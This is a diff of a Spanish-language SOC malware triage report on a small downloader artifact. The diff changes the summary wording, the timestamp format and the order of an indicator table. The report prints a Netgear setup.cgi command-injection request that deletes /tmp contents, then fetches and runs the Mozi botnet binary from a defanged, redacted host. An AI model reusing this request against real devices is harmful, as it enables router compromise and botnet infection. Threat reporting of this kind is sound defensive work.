@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 173 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `netgear` en `hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:44:36+00:00`
+- **Registrado:** `2026-08-09T19:44:36.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,8 +54,8 @@ GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://[
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
 | url | hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
-| hash | edaffc63f29b42ae9ff2213fab36fb1c98436552031b0c76c012c085a0b7ce55 | static_analysis |
 | command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+/tmp/netgear;s | strings |
+| hash | edaffc63f29b42ae9ff2213fab36fb1c98436552031b0c76c012c085a0b7ce55 | static_analysis |
 | ip | 103.213.112.XXX | artifact_source |
 
 ## 🔎 Triage
